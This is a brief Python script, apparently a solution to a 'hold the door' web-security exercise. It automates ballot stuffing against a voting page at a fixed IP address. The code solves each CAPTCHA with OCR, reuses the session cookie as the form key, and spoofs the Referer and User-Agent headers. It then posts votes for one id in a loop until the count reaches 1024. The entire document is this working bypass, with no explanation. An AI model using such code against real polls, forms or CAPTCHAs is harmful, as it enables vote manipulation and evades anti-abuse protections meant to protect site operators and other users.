import requests
import shutil
try:
    import Image
except ImportError:
    from PIL import Image
import pytesseract

header =  {'Content-Type': 'application/x-www-form-urlencoded',
           'Referer': 'http://54.221.6.249/level3.php',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'

}
URL = 'http://54.221.6.249/level3.php'
payload = {
    'id': '81',
    'holdthedoor': 'Submit',
    'key': '0',
    'captcha': '0'
}

def captcha(cookies):
    r = requests.get('http://54.221.6.249/captcha.php', cookies=cookies, stream=True)
    if r.status_code == 200:
        with open('./file', 'wb') as f:
            r.raw.decode_content = True
            shutil.copyfileobj(r.raw, f)
    im = Image.open('file')
    im = im.convert("RGBA")
    im.save('temp2.jpg')
    return(pytesseract.image_to_string(Image.open('temp2.jpg')))

r = requests.get(URL)
while "81    </td>\n    <td>\n1024" not in r.text:
    cookies = r.cookies
    payload['captcha'] = str(captcha(cookies))
    payload['key'] = cookies['HoldTheDoor']
    r = requests.post(URL, data=payload, headers=header, cookies=cookies)
    r = requests.get(URL)
print("Voting complete!")
